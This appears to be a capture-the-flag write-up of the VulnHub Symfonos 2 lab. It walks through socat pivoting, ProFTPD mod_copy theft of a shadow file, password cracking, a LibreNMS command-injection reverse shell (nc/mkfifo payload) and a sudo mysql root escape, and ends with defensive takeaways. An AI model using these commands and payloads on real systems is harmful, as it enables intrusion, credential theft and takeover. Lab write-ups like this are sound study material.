Symfonos 2 is the second half of the **VulnHub** pivoting lab — the machine that only lives on the internal `10.0.0.0/24` network, with no route from my host. I reach it entirely *through* [Symfonos 1](/posts/symfonos-1/), which I already rooted and turned into a pivot. From there it's a chain of its own: **ProFTPD `mod_copy`** (**CVE-2015-3306**) to steal `/etc/shadow` with no login, a cracked hash for `aeolus`, a *second* pivot to an internal **LibreNMS** panel exploited by hand for a shell as `cronus`, and `sudo mysql` to root. As with Symfonos 1, my scripts and sessions are kept in full.

## Reaching the Machine

Everything here runs against the hidden host **behind [Symfonos 1](/posts/symfonos-1/)**. On that first machine (which I rooted separately) I set up `socat` relays that forward Symfonos 2's ports out to my host — so `192.168.56.6:100xx` reaches `10.0.0.103:xx`:

```bash
# on symfonos1 (the pivot): one relay per port, e.g.
socat TCP-LISTEN:10021,reuseaddr,fork TCP-CONNECT:10.0.0.103:21 &
socat TCP-LISTEN:10022,reuseaddr,fork TCP-CONNECT:10.0.0.103:22 &   # ... 80/139/445 too
```

The full pivot setup (second interface, ping sweep, `portScan.sh`, `pivot.sh`) is in the [Symfonos 1 writeup](/posts/symfonos-1/#pivoting-to-symfonos-2). From here I treat `192.168.56.6:100xx` as Symfonos 2.

## Reconnaissance Through the Pivot

Scanning the forwarded ports reveals Symfonos 2 as if it were local:

```bash
sudo nmap -p10021,10022,10080,10139,10445 -sCV 192.168.56.6 -oN nmap2
# 10021  ftp         ProFTPD 1.3.5
# 10022  ssh         OpenSSH 7.4p1 Debian
# 10080  http        WebFS httpd 1.21
# 10139  netbios-ssn Samba
# 10445  netbios-ssn Samba
```

The anonymous SMB share holds a `backups/log.txt` that leaks the box's own layout — an `/etc/shadow` backup at `/var/backups/shadow.bak`, and that the Samba `anonymous` share maps to `/home/aeolus/share`:

```bash
smbclient \\\\192.168.56.6\\anonymous -p 10445 -N
smb: \> cd backups ; get log.txt
```

```text
root@symfonos2:~# cat /etc/shadow > /var/backups/shadow.bak
root@symfonos2:~# cat /etc/samba/smb.conf
[anonymous]
   path = /home/aeolus/share
```

## Initial Access — `aeolus` via ProFTPD mod_copy (CVE-2015-3306)

**ProFTPD 1.3.5** has the `mod_copy` module enabled, exposing `SITE CPFR`/`SITE CPTO` — an **unauthenticated** way to copy any file the ProFTPD process can read to any path it can write. Since the `anonymous` SMB share *is* `/home/aeolus/share`, I copy sensitive files there and read them over SMB. First `/etc/passwd` to learn the users:

```text
└─❯ nc 192.168.56.6 10021
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.0.0.103]
site cpfr /etc/passwd
350 File or directory exists, ready for destination name
site cpto /home/aeolus/share/passwd.copy
250 Copy successful
```

```bash
smbclient \\\\192.168.56.6\\anonymous -p 10445 -N -c 'get passwd.copy'
cat passwd.copy | grep "sh$"
# root:x:0:0:root:/root:/bin/bash
# aeolus:x:1000:1000:,,,:/home/aeolus:/bin/bash
# cronus:x:1001:1001:,,,:/home/cronus:/bin/bash
```

Then the shadow backup the log told us about:

```text
└─❯ nc 192.168.56.6 10021
site cpfr /var/backups/shadow.bak
350 File or directory exists, ready for destination name
site cpto /home/aeolus/share/shadow.bak
250 Copy successful
```

```bash
smbclient \\\\192.168.56.6\\anonymous -p 10445 -N -c 'get shadow.bak'
cat shadow.bak
# root:$6$VTftENaZ$...
# aeolus:$6$dgjUjE.Y$...
# cronus:$6$wOmUfiZO$...
```

The `$6$` hashes are sha512crypt (hashcat mode 1800); `aeolus` falls to rockyou:

```bash
hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt
# $6$dgjUjE.Y$...:sergioteamo
```

**`aeolus:sergioteamo`**. (The same password also falls to an `hydra` FTP brute-force against the forwarded port — `hydra -l aeolus -P rockyou.txt ftp://192.168.56.6 -s 10021` — a slower alternative to cracking the hash offline.) Those creds log straight into SSH through the pivot:

```bash
ssh aeolus@192.168.56.6 -p 10022      # password: sergioteamo
aeolus@symfonos2:~$ hostname -I
# 10.0.0.103
```

## Lateral Movement — `aeolus` → `cronus` (LibreNMS)

As `aeolus`, the interesting services are bound to localhost only — MySQL, SMTP, and a web app on `127.0.0.1:8080`:

```bash
aeolus@symfonos2:~$ ss -nltp
# LISTEN 127.0.0.1:3306
# LISTEN 127.0.0.1:8080
# LISTEN 127.0.0.1:25
```

### A second pivot

To reach `8080` from my host I need **two** more hops: Symfonos 2 forwards its own `8080` out to the internal network, and Symfonos 1 forwards that on to my host.

```bash
# on symfonos2: expose 127.0.0.1:8080 on the internal interface as :8000
aeolus@symfonos2:/tmp$ socat TCP-LISTEN:8000,reuseaddr,fork TCP-CONNECT:127.0.0.1:8080 &
```

```bash
# on symfonos1 (the pivot): forward :18000 → symfonos2:8000
bash-4.4# socat TCP-LISTEN:18000,reuseaddr,fork TCP-CONNECT:10.0.0.103:8000 &
```

Now my host reaches the panel at `192.168.56.6:18000` — it's **LibreNMS**, and `aeolus:sergioteamo` logs in:

```bash
curl http://192.168.56.6:18000
# Redirecting to http://192.168.56.6:18000/login
```

### LibreNMS addhost RCE

LibreNMS 1.46 has a known **command injection** in the *Add Device* flow (EDB 47044): the SNMP **community** string is passed unsanitised into an OS command when the device is polled. The ready exploit created the device but never landed a shell, so I did it by hand. On the **Add Device** page I set a hostname, turn SNMP on, and put a reverse-shell payload in the **Community** field — aimed at `10.0.0.103:4444`, where `aeolus` is listening:

```text
'$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.103 4444 >/tmp/f) #
```

![LibreNMS Add Device form with the reverse-shell payload in the Community field](/assets/img/VulnHub/Symfonos-2/cap1.png)

With "Force add" checked the device saves, and the payload fires when SNMP is polled — I trigger it from **Capture Debug Information → SNMP → Run**:

![Capture Debug Information page, SNMP tab, Run button](/assets/img/VulnHub/Symfonos-2/cap2.png)

```bash
aeolus@symfonos2:~$ nc -nvlp 4444
connect to [10.0.0.103] from (UNKNOWN) [10.0.0.103] 57564
$ whoami
cronus       # LibreNMS runs as cronus
```

A shell as **`cronus`**. After the TTY upgrade I again drop my public key into `~/.ssh/authorized_keys` for stable access.

## Privilege Escalation — `cronus` → `root` (sudo mysql)

`cronus` can run `mysql` as root with no password:

```bash
cronus@symfonos2:~$ sudo -l
# User cronus may run the following commands on symfonos2:
#     (root) NOPASSWD: /usr/bin/mysql
```

`mysql`'s `\!` runs a shell command — and since it's running as root, that shell is root ([GTFOBins](https://gtfobins.github.io/gtfobins/mysql/)):

```bash
cronus@symfonos2:~$ sudo mysql -e '\! /bin/sh'
# whoami
root
# cat /root/proof.txt
# Congrats on rooting symfonos:2!   (ASCII art trimmed)
```

Root on Symfonos 2 — both machines of the lab owned, start to finish through the pivot.

## Key Takeaways

- **`mod_copy` is pre-auth file read/write.** ProFTPD's `SITE CPFR`/`CPTO` copied `/etc/shadow` into an SMB-readable path with no login at all — a reminder that an "anonymous, read-only" share plus an unauthenticated copy primitive equals full credential disclosure.
- **Pivoting is layered, not a single hop.** Reaching Symfonos 2 took a `socat` forward per port on Symfonos 1; reaching *its* localhost-only LibreNMS took a *second* `socat` on each host. Keeping the chain of relays straight — who exposes what, to whom — is the core skill of a multi-host network.
- **Monitoring tools run commands for a living.** LibreNMS polls devices by shelling out, so an unsanitised SNMP community string is RCE as the service account. Admin access to an NMS is close to code execution on its host by design — and here that service account (`cronus`) was one weak sudo rule from root.
- **`sudo … mysql` is `sudo … sh`.** Any program that can run a shell command (`mysql`'s `\!`, `vi`, `find`, `awk`…) under `sudo` is a full root shell via GTFOBins. Sudo rules must grant a *capability*, not a *binary* — `/usr/bin/mysql` as root was effectively `ALL`.
